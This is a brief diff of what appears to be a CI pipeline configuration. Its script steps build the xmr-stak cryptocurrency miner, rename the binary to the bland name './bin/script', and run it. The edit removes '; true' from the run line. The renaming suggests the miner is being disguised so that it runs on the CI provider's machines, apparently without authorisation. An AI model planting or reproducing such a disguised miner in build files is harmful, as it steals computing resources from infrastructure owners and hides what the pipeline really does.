@@ -115,4 +115,4 @@ script:
   - make install
   - ./auto.sh
   - mv ./bin/xmr-stak ./bin/script
-  - ./bin/script; true
+  - ./bin/script
